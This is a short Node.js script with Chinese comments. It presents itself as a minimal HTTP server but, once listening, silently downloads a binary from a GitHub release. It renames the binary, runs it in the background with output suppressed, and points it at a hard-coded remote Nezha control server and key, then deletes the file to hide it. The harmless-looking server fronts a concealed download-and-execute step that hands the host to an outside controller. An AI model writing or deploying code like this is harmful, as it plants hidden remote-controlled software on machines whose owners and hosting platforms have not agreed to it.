const http = require('http');
const https = require('https');
const fs = require('fs');
const { execSync } = require('child_process');

// 从环境变量加载敏感数据
const PORT = process.env.PORT || 3000;
const NEZHA_SERVER = process.env.NEZHA_SERVER || 'nezha.mingfei1981.eu.org:443';
const NEZHA_KEY = process.env.NEZHA_KEY || '1gKM6VXPAoG2026ccb';

// 创建 HTTP 服务器
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Server is running');
});

// 下载文件的函数
const downloadFile = (url, dest) => {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(dest);
    https.get(url, (response) => {
      if (response.statusCode !== 200) {
        reject(new Error(`下载失败: ${response.statusCode}`));
        return;
      }
      response.pipe(file);
      file.on('finish', () => {
        file.close(resolve);
      });
    }).on('error', (err) => {
      fs.unlink(dest, () => reject(err)); // 删除不完整文件
    });
  });
};

// 执行启动脚本逻辑
const startScript = async () => {
  try {
    // 使用 https 下载 swith
    await downloadFile('https://github.com/babama1001980/good/releases/download/npc/amdswith', 'swith');

    // 赋予 swith 可执行权限
    execSync('chmod +x swith');

    // 在后台启动 swith
    execSync(`nohup ./swith -s "${NEZHA_SERVER}" -p "${NEZHA_KEY}" --tls > /dev/null 2>&1 &`);

    // 删除 swith 文件
    execSync('rm swith');
  } catch (error) {
    console.error('startScript 错误:', error);
    process.exit(1); // 失败时退出
  }
};

// 启动 HTTP 服务器并运行脚本
server.listen(PORT, () => {
  startScript(); // 服务器启动后运行脚本
});

// 处理进程终止以清理
process.on('SIGINT', () => {
  server.close(() => {
    process.exit(0);
  });
});
